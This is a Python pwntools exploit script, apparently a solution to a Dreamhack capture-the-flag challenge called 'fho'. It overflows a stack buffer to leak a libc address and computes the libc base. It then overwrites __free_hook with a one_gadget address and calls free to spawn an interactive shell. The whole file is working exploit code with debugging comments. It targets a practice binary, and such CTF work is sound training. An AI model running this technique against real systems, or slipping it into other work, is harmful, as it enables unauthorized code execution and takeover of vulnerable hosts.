from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

# p = remote("host1.dreamhack.games", 14600)
p = process("./fho")
e = ELF("./fho")

gdb.attach(p)

# [1] Get information about buf
buf2cnry = 0x30+0x8
buf2ret = buf2cnry+0x8+0x8

# slog("buf <=> canary", buf2cnry)

# [2] Get libc_base
payload = b"A"*(buf2ret)

p.recvuntil(b"Buf: ")
p.send(payload) #sendline is have \n

p.recvuntil(payload)
tmp=p.recvn(6) #64bit
libc_start_main_xx = u64(tmp+b"\x00"*2)

slog("libc_start_main+231", libc_start_main_xx)

# [3] Get offset of system
libc = e.libc
# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 243)
# libc_base = libc_start_main_xx - libc.symbols["__libc_start_main_ret"]
# system_addr = libc_base + libc.symbols["system"]
free_addr = libc_base + libc.symbols["__free_hook"]
# bin_sh = libc_base + next(libc.search(b"/bin/sh"))
og = libc_base + 0xe6c7e

slog("libc_base", libc_base)
# slog("system_addr", system_addr)
slog("__hook_free_addr", free_addr)
# slog("bin_sh", bin_sh)

p.recvuntil(b"To write: ")
p.sendline(str(free_addr)) #sendline is have \n

p.recvuntil(b"With: ")
p.sendline(str(og)) #sendline is have \n

# why not input "/bin/sh\x00"?
# in hook_func, input value *([])? 
p.recvuntil(b"To free: ")
p.sendline(str(0x1103)) #sendline is have \n

p.interactive()